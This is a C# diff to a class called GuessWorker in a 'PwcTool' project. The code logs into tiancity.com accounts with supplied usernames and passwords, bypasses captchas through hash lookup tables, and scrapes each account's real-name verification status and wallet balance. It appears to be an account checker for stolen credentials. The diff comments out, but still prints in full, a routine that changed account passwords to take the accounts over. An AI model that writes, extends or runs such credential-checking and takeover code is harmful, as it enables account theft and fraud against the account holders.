@@ -39,7 +39,7 @@ namespace PwcTool
         public Dictionary<string, string> m_lgcaptcha;
         public Dictionary<string, string> m_pwcaptcha;
 
-        public event Action<GuessWorker,string, string, string, bool, int, int> FinishTask;
+        public event Action<GuessWorker,string, string, string, int, int, int> FinishTask;
 
         const string md5js = "cstc.js";
         string m_safekey = "";
@@ -50,9 +50,9 @@ namespace PwcTool
 
         public int IpToken = 0;
 
-        bool m_has_idcard;
-        int m_YuE;
-        int m_userpoint;
+        //bool m_has_idcard;
+        //int m_YuE;
+        //int m_userpoint;
 
         public GuessWorker(Dictionary<string, string> lg, Dictionary<string, string> pw, string safekey)
         {
@@ -70,9 +70,9 @@ namespace PwcTool
             workArgument = obj;
             IpToken = iptoken;
 
-            m_has_idcard = false;
-            m_YuE = 0;
-            m_userpoint = 0;
+            //m_has_idcard = false;
+            //m_YuE = 0;
+            //m_userpoint = 0;
             try
             {
                 m_logger.Debug("====Begin uid:" + uid + "this:" + this.GetHashCode());
@@ -440,7 +440,9 @@ namespace PwcTool
                 string s = reader.ReadToEnd();
                 response.Close();
                 reader.Close();
-                bool has_idcard = true;
+                int has_idcard = 0;
+
+                int bt = System.Environment.TickCount;
 
                 string pattern = "[\\s\\S]*?真实姓名[\\s\\S]*?value=\"([^\"]*)\"";
                 Match mt = Regex.Match(s, pattern);
@@ -448,8 +450,18 @@ namespace PwcTool
                 {
                     if (string.IsNullOrEmpty(mt.Groups[1].ToString()))
                     {
-                        has_idcard = false;
+                        has_idcard = 1;
                     }
+                    else
+                    {
+                        has_idcard = 2;
+                    }
+                }
+
+                int et = System.Environment.TickCount;
+                if (et - bt > 200)
+                {
+                    m_logger.Debug("OnTryGetIsIdCardSafe 超时{0}", (et - bt));
                 }
 
                 string url = "http://pay.tiancity.com/Wallet/UserService.aspx";
@@ -458,7 +470,7 @@ namespace PwcTool
                 next_request.Timeout = 1000 * 60;
                 next_request.ContentType = "application/x-www-form-urlencoded";
                 next_request.CookieContainer = request.CookieContainer;
-                next_request.BeginGetResponse(new AsyncCallback(OnTryGetYuEScore), new Tuple<HttpWebRequest, string, string, bool>(next_request, uid, pwd, has_idcard));
+                next_request.BeginGetResponse(new AsyncCallback(OnTryGetYuEScore), new Tuple<HttpWebRequest, string, string, int>(next_request, uid, pwd, has_idcard));
             }
             catch (System.Exception ex)
             {
@@ -470,11 +482,11 @@ namespace PwcTool
         {
             try
             {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, bool>;
+                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, int>;
                 HttpWebRequest request = tuple.Item1;
                 string uid = tuple.Item2;
                 string pwd = tuple.Item3;
-                bool has_idcard = tuple.Item4;
+                int has_idcard = tuple.Item4;
                 int YuE = -1;
 
                 HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
@@ -485,7 +497,7 @@ namespace PwcTool
 
                 if (!String.IsNullOrEmpty(s))
                 {
-                    string pattern = "[^可用余额]*可用余额[^0-9]*([0-9]+)点";
+                    string pattern = "可用余额[^0-9]*([0-9]+)点";
                     Match mt = Regex.Match(s, pattern);
                     if (mt.Groups.Count == 2)
                     {
@@ -493,60 +505,15 @@ namespace PwcTool
                     }
                 }
 
-                string url = "http://pay.tiancity.com/Wallet/UserPoint.aspx";
-                HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
-                next_request.ServicePoint.Expect100Continue = false;
-                next_request.Timeout = 1000 * 60;
-                next_request.ContentType = "application/x-www-form-urlencoded";
-                next_request.CookieContainer = request.CookieContainer;
-                next_request.BeginGetResponse(new AsyncCallback(OnTryGetUserPoint), new Tuple<HttpWebRequest, string, string, bool, int>(next_request, uid, pwd, has_idcard, YuE));
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+                TaskFinishInvoke(this, uid, pwd, "查询成功", has_idcard, YuE, -1);
 
-        void OnTryGetUserPoint(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, bool, int>;
-                HttpWebRequest request = tuple.Item1;
-                string uid = tuple.Item2;
-                string pwd = tuple.Item3;
-                bool has_idcard = tuple.Item4;
-                int YuE = tuple.Item5;
-                int userpoint = -1;
-
-                HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
-                StreamReader reader = new StreamReader(response.GetResponseStream(),Encoding.GetEncoding("GB2312"));
-                string s = reader.ReadToEnd();
-                response.Close();
-                reader.Close();
-
-                if (!String.IsNullOrEmpty(s))
-                {
-                    string pattern = "[^可用积分]*可用积分[^0-9]*([0-9]+)积分";
-                    Match mt = Regex.Match(s, pattern);
-                    if (mt.Groups.Count == 2)
-                    {
-                        userpoint = int.Parse(mt.Groups[1].ToString());
-                    }
-                }
-
-                //string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
+                //string url = "http://pay.tiancity.com/Wallet/UserPoint.aspx";
                 //HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
                 //next_request.ServicePoint.Expect100Continue = false;
                 //next_request.Timeout = 1000 * 60;
-                //next_request.Method = "POST";
-                //next_request.ContentLength = 0;
                 //next_request.ContentType = "application/x-www-form-urlencoded";
-                //next_request.CookieContainer = new CookieContainer();
-                //next_request.CookieContainer.Add(response.Cookies);
-                //next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, m_rgen.Next(1000000,9999999).ToString()));
-
-                TaskFinishInvoke(this, uid, pwd, "查询成功", has_idcard, YuE, userpoint);
+                //next_request.CookieContainer = request.CookieContainer;
+                //next_request.BeginGetResponse(new AsyncCallback(OnTryGetUserPoint), new Tuple<HttpWebRequest, string, string, bool, int>(next_request, uid, pwd, has_idcard, YuE));
             }
             catch (System.Exception ex)
             {
@@ -554,215 +521,262 @@ namespace PwcTool
             }
         }
 
-        void OnTryChangePwd_GetCaptchaUrl(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
-                HttpWebRequest request = tuple.Item1;
-                string uid = tuple.Item2;
-                string pwd = tuple.Item3;
-                string newpwd = tuple.Item4;
+        //void OnTryGetUserPoint(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, bool, int>;
+        //        HttpWebRequest request = tuple.Item1;
+        //        string uid = tuple.Item2;
+        //        string pwd = tuple.Item3;
+        //        bool has_idcard = tuple.Item4;
+        //        int YuE = tuple.Item5;
+        //        int userpoint = -1;
 
-                HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
-                AsyncRead(response.GetResponseStream(), new Action<byte[]>((buffer) =>
-                {
-                    string s = System.Text.Encoding.UTF8.GetString(buffer);
-                    response.Close();
-                    JObject jsObj = JObject.Parse(s);
-                    string url = jsObj["Url"].ToString() + "&r=" + m_rgen.NextDouble() * 99999;
+        //        HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
+        //        StreamReader reader = new StreamReader(response.GetResponseStream(),Encoding.GetEncoding("GB2312"));
+        //        string s = reader.ReadToEnd();
+        //        response.Close();
+        //        reader.Close();
 
-                    HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
-                    next_request.ServicePoint.Expect100Continue = false;
-                    next_request.Timeout = 1000 * 60;
-                    next_request.ContentType = "application/x-www-form-urlencoded";
-                    next_request.CookieContainer = request.CookieContainer;
-                    next_request.CookieContainer.Add(response.Cookies);
-                    next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_Captcha), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
-                    return;
-                }));
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+        //        if (!String.IsNullOrEmpty(s))
+        //        {
+        //            string pattern = "[^可用积分]*可用积分[^0-9]*([0-9]+)积分";
+        //            Match mt = Regex.Match(s, pattern);
+        //            if (mt.Groups.Count == 2)
+        //            {
+        //                userpoint = int.Parse(mt.Groups[1].ToString());
+        //            }
+        //        }
 
-        void OnTryChangePwd_Captcha(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
-                HttpWebRequest request = tuple.Item1;
-                string uid = tuple.Item2;
-                string pwd = tuple.Item3;
-                string newpwd = tuple.Item4;
+        //        //string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
+        //        //HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
+        //        //next_request.ServicePoint.Expect100Continue = false;
+        //        //next_request.Timeout = 1000 * 60;
+        //        //next_request.Method = "POST";
+        //        //next_request.ContentLength = 0;
+        //        //next_request.ContentType = "application/x-www-form-urlencoded";
+        //        //next_request.CookieContainer = new CookieContainer();
+        //        //next_request.CookieContainer.Add(response.Cookies);
+        //        //next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, m_rgen.Next(1000000,9999999).ToString()));
 
-                HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
-                Stream s = response.GetResponseStream();
-                byte[] img_buf = new byte[1024 * 10];
+        //        TaskFinishInvoke(this, uid, pwd, "查询成功", has_idcard, YuE, userpoint);
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
 
-                s.BeginRead(img_buf, 0, img_buf.Length, new AsyncCallback(OnReadChangePwdCaptcha), new Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>(
-                    tuple, img_buf, 0, s, response));
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+        //void OnTryChangePwd_GetCaptchaUrl(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
+        //        HttpWebRequest request = tuple.Item1;
+        //        string uid = tuple.Item2;
+        //        string pwd = tuple.Item3;
+        //        string newpwd = tuple.Item4;
 
-        void OnReadChangePwdCaptcha(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>;
-                byte[] img_buffer = tuple.Item2;
-                int readbytes = tuple.Item3;
-                Stream s = tuple.Item4;
-                HttpWebResponse response = tuple.Item5;
+        //        HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
+        //        AsyncRead(response.GetResponseStream(), new Action<byte[]>((buffer) =>
+        //        {
+        //            string s = System.Text.Encoding.UTF8.GetString(buffer);
+        //            response.Close();
+        //            JObject jsObj = JObject.Parse(s);
+        //            string url = jsObj["Url"].ToString() + "&r=" + m_rgen.NextDouble() * 99999;
 
-                int nrecv = s.EndRead(ar);
-                if (nrecv > 0)
-                {
-                    int offset = readbytes + nrecv;
-                    s.BeginRead(img_buffer, offset, img_buffer.Length - offset, new AsyncCallback(OnReadChangePwdCaptcha), new Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>(
-                        tuple.Item1, img_buffer, offset, s, response));
-                }
-                else
-                {
-                    s.Close();
-                    response.Close();
+        //            HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
+        //            next_request.ServicePoint.Expect100Continue = false;
+        //            next_request.Timeout = 1000 * 60;
+        //            next_request.ContentType = "application/x-www-form-urlencoded";
+        //            next_request.CookieContainer = request.CookieContainer;
+        //            next_request.CookieContainer.Add(response.Cookies);
+        //            next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_Captcha), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
+        //            return;
+        //        }));
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
 
-                    HttpWebRequest request = tuple.Item1.Item1;
-                    string uid = tuple.Item1.Item2;
-                    string pwd = tuple.Item1.Item3;
-                    string newpwd = tuple.Item1.Item4;
+        //void OnTryChangePwd_Captcha(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
+        //        HttpWebRequest request = tuple.Item1;
+        //        string uid = tuple.Item2;
+        //        string pwd = tuple.Item3;
+        //        string newpwd = tuple.Item4;
 
-                    MD5 md5 = new MD5CryptoServiceProvider();
-                    byte[] md5_bytes = md5.ComputeHash(img_buffer, 0, readbytes);
-                    string md5_str = BitConverter.ToString(md5_bytes).Replace("-", "");
-                    string old_md5_str = md5_str;
-                    md5_str = cs_md5(md5_str + Uid);
-                    md5_str = cs_md5(md5_str + Matchinfo + old_md5_str);
-                    md5_str = cs_md5(md5_str + DBpwd + old_md5_str);
-                    if (m_pwcaptcha.ContainsKey(md5_str))
-                    {
-                        string cap = m_pwcaptcha[md5_str];
-                        //m_logger.Debug("pwcaptcha 发现 name:" + md5_str + " value:" + cap);
+        //        HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
+        //        Stream s = response.GetResponseStream();
+        //        byte[] img_buf = new byte[1024 * 10];
 
-                        string post = "old_pwd=" + Encrypt(pwd) + "&new_pwd1=" + Encrypt(newpwd) + "&new_pwd2=" + Encrypt(newpwd) + "&captcha=" + cap;
-                        byte[] post_buffer = System.Text.Encoding.UTF8.GetBytes(post);
+        //        s.BeginRead(img_buf, 0, img_buf.Length, new AsyncCallback(OnReadChangePwdCaptcha), new Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>(
+        //            tuple, img_buf, 0, s, response));
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
 
-                        string url = "http://aq.tiancity.com/Pwd/PostPwdModify";
-                        HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
-                        next_request.ServicePoint.Expect100Continue = false;
-                        next_request.Timeout = 1000 * 60;
-                        next_request.Method = "POST";
-                        next_request.ContentLength = post_buffer.Length;
-                        next_request.ContentType = "application/x-www-form-urlencoded";
-                        next_request.CookieContainer = request.CookieContainer;
-                        next_request.CookieContainer.Add(response.Cookies);
+        //void OnReadChangePwdCaptcha(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>;
+        //        byte[] img_buffer = tuple.Item2;
+        //        int readbytes = tuple.Item3;
+        //        Stream s = tuple.Item4;
+        //        HttpWebResponse response = tuple.Item5;
 
-                        next_request.BeginGetRequestStream(new AsyncCallback(OnGetPostChangePwdBufferStream), new Tuple<HttpWebRequest, string, string, string, byte[]>(next_request, uid, pwd, newpwd, post_buffer));
-                    }
-                    else
-                    {
-                        //不能识别,重新尝试获取验证码
-                        string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
-                        HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
-                        next_request.ServicePoint.Expect100Continue = false;
-                        next_request.Timeout = 1000 * 60;
-                        next_request.Method = "POST";
-                        next_request.ContentLength = 0;
-                        next_request.ContentType = "application/x-www-form-urlencoded";
-                        next_request.CookieContainer = request.CookieContainer;
-                        next_request.CookieContainer.Add(response.Cookies);
-                        next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
-                    }
-                }
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+        //        int nrecv = s.EndRead(ar);
+        //        if (nrecv > 0)
+        //        {
+        //            int offset = readbytes + nrecv;
+        //            s.BeginRead(img_buffer, offset, img_buffer.Length - offset, new AsyncCallback(OnReadChangePwdCaptcha), new Tuple<Tuple<HttpWebRequest, string, string, string>, byte[], int, Stream, HttpWebResponse>(
+        //                tuple.Item1, img_buffer, offset, s, response));
+        //        }
+        //        else
+        //        {
+        //            s.Close();
+        //            response.Close();
 
-        void OnGetPostChangePwdBufferStream(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string, byte[]>;
-                HttpWebRequest request = tuple.Item1;
-                string uid = tuple.Item2;
-                string pwd = tuple.Item3;
-                string newpwd = tuple.Item4;
-                byte[] post_buffer = tuple.Item5;
+        //            HttpWebRequest request = tuple.Item1.Item1;
+        //            string uid = tuple.Item1.Item2;
+        //            string pwd = tuple.Item1.Item3;
+        //            string newpwd = tuple.Item1.Item4;
 
-                Stream postStream = request.EndGetRequestStream(ar);
-                postStream.Write(post_buffer, 0, post_buffer.Length);
-                postStream.Close();
+        //            MD5 md5 = new MD5CryptoServiceProvider();
+        //            byte[] md5_bytes = md5.ComputeHash(img_buffer, 0, readbytes);
+        //            string md5_str = BitConverter.ToString(md5_bytes).Replace("-", "");
+        //            string old_md5_str = md5_str;
+        //            md5_str = cs_md5(md5_str + Uid);
+        //            md5_str = cs_md5(md5_str + Matchinfo + old_md5_str);
+        //            md5_str = cs_md5(md5_str + DBpwd + old_md5_str);
+        //            if (m_pwcaptcha.ContainsKey(md5_str))
+        //            {
+        //                string cap = m_pwcaptcha[md5_str];
+        //                //m_logger.Debug("pwcaptcha 发现 name:" + md5_str + " value:" + cap);
 
-                request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_Result), new Tuple<HttpWebRequest, string, string, string>(request, uid, pwd, newpwd));
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+        //                string post = "old_pwd=" + Encrypt(pwd) + "&new_pwd1=" + Encrypt(newpwd) + "&new_pwd2=" + Encrypt(newpwd) + "&captcha=" + cap;
+        //                byte[] post_buffer = System.Text.Encoding.UTF8.GetBytes(post);
 
-        void OnTryChangePwd_Result(IAsyncResult ar)
-        {
-            try
-            {
-                var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
-                HttpWebRequest request = tuple.Item1;
-                string uid = tuple.Item2;
-                string pwd = tuple.Item3;
-                string newpwd = tuple.Item4;
+        //                string url = "http://aq.tiancity.com/Pwd/PostPwdModify";
+        //                HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
+        //                next_request.ServicePoint.Expect100Continue = false;
+        //                next_request.Timeout = 1000 * 60;
+        //                next_request.Method = "POST";
+        //                next_request.ContentLength = post_buffer.Length;
+        //                next_request.ContentType = "application/x-www-form-urlencoded";
+        //                next_request.CookieContainer = request.CookieContainer;
+        //                next_request.CookieContainer.Add(response.Cookies);
 
-                HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
-                AsyncRead(response.GetResponseStream(), new Action<byte[]>((buffer) =>
-                {
-                    string s = System.Text.Encoding.UTF8.GetString(buffer);
-                    response.Close();
+        //                next_request.BeginGetRequestStream(new AsyncCallback(OnGetPostChangePwdBufferStream), new Tuple<HttpWebRequest, string, string, string, byte[]>(next_request, uid, pwd, newpwd, post_buffer));
+        //            }
+        //            else
+        //            {
+        //                //不能识别,重新尝试获取验证码
+        //                string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
+        //                HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
+        //                next_request.ServicePoint.Expect100Continue = false;
+        //                next_request.Timeout = 1000 * 60;
+        //                next_request.Method = "POST";
+        //                next_request.ContentLength = 0;
+        //                next_request.ContentType = "application/x-www-form-urlencoded";
+        //                next_request.CookieContainer = request.CookieContainer;
+        //                next_request.CookieContainer.Add(response.Cookies);
+        //                next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
+        //            }
+        //        }
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
 
-                    JObject jsObj = JObject.Parse(s);
-                    if (jsObj["Code"].ToString() == "1")
-                    {
-                        TaskFinishInvoke(this, uid, newpwd, "查询成功", m_has_idcard, m_YuE, m_userpoint);
-                    }
-                    else
-                    {
-                        string retstr = jsObj["Msg"].ToString();
-                        if (retstr == "验证码不正确")
-                        {
-                            m_logger.Debug("uid:" + uid + "验证码错误,重新尝试获取验证码!");
-                            string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
-                            HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
-                            next_request.ServicePoint.Expect100Continue = false;
-                            next_request.Timeout = 1000 * 60;
-                            next_request.Method = "POST";
-                            next_request.ContentLength = 0;
-                            next_request.ContentType = "application/x-www-form-urlencoded";
-                            next_request.CookieContainer = request.CookieContainer;
-                            next_request.CookieContainer.Add(response.Cookies);
-                            next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
-                        }
-                        else
-                        {
-                            TaskFinishInvoke(this, uid, pwd, "查询成功", m_has_idcard, m_YuE, m_userpoint);
-                        }
-                    }
-                }));
-            }
-            catch (System.Exception ex)
-            {
-                m_logger.Error(ex.ToString());
-            }
-        }
+        //void OnGetPostChangePwdBufferStream(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string, byte[]>;
+        //        HttpWebRequest request = tuple.Item1;
+        //        string uid = tuple.Item2;
+        //        string pwd = tuple.Item3;
+        //        string newpwd = tuple.Item4;
+        //        byte[] post_buffer = tuple.Item5;
+
+        //        Stream postStream = request.EndGetRequestStream(ar);
+        //        postStream.Write(post_buffer, 0, post_buffer.Length);
+        //        postStream.Close();
+
+        //        request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_Result), new Tuple<HttpWebRequest, string, string, string>(request, uid, pwd, newpwd));
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
+
+        //void OnTryChangePwd_Result(IAsyncResult ar)
+        //{
+        //    try
+        //    {
+        //        var tuple = ar.AsyncState as Tuple<HttpWebRequest, string, string, string>;
+        //        HttpWebRequest request = tuple.Item1;
+        //        string uid = tuple.Item2;
+        //        string pwd = tuple.Item3;
+        //        string newpwd = tuple.Item4;
+
+        //        HttpWebResponse response = (HttpWebResponse)request.EndGetResponse(ar);
+        //        AsyncRead(response.GetResponseStream(), new Action<byte[]>((buffer) =>
+        //        {
+        //            string s = System.Text.Encoding.UTF8.GetString(buffer);
+        //            response.Close();
+
+        //            JObject jsObj = JObject.Parse(s);
+        //            if (jsObj["Code"].ToString() == "1")
+        //            {
+        //                TaskFinishInvoke(this, uid, newpwd, "查询成功", m_has_idcard, m_YuE, m_userpoint);
+        //            }
+        //            else
+        //            {
+        //                string retstr = jsObj["Msg"].ToString();
+        //                if (retstr == "验证码不正确")
+        //                {
+        //                    m_logger.Debug("uid:" + uid + "验证码错误,重新尝试获取验证码!");
+        //                    string url = "http://aq.tiancity.com/Home/GetCaptchaUrl";
+        //                    HttpWebRequest next_request = System.Net.WebRequest.Create(url) as HttpWebRequest;
+        //                    next_request.ServicePoint.Expect100Continue = false;
+        //                    next_request.Timeout = 1000 * 60;
+        //                    next_request.Method = "POST";
+        //                    next_request.ContentLength = 0;
+        //                    next_request.ContentType = "application/x-www-form-urlencoded";
+        //                    next_request.CookieContainer = request.CookieContainer;
+        //                    next_request.CookieContainer.Add(response.Cookies);
+        //                    next_request.BeginGetResponse(new AsyncCallback(OnTryChangePwd_GetCaptchaUrl), new Tuple<HttpWebRequest, string, string, string>(next_request, uid, pwd, newpwd));
+        //                }
+        //                else
+        //                {
+        //                    TaskFinishInvoke(this, uid, pwd, "查询成功", m_has_idcard, m_YuE, m_userpoint);
+        //                }
+        //            }
+        //        }));
+        //    }
+        //    catch (System.Exception ex)
+        //    {
+        //        m_logger.Error(ex.ToString());
+        //    }
+        //}
 
 
-        void TaskFinishInvoke(GuessWorker worker, string uid, string pwd, string ret,bool has_idcard = true,int yue = 0,int userpoint = 0)
+        void TaskFinishInvoke(GuessWorker worker, string uid, string pwd, string ret,int has_idcard = 0,int yue = 0,int userpoint = 0)
         {
             if (FinishTask != null)
             {
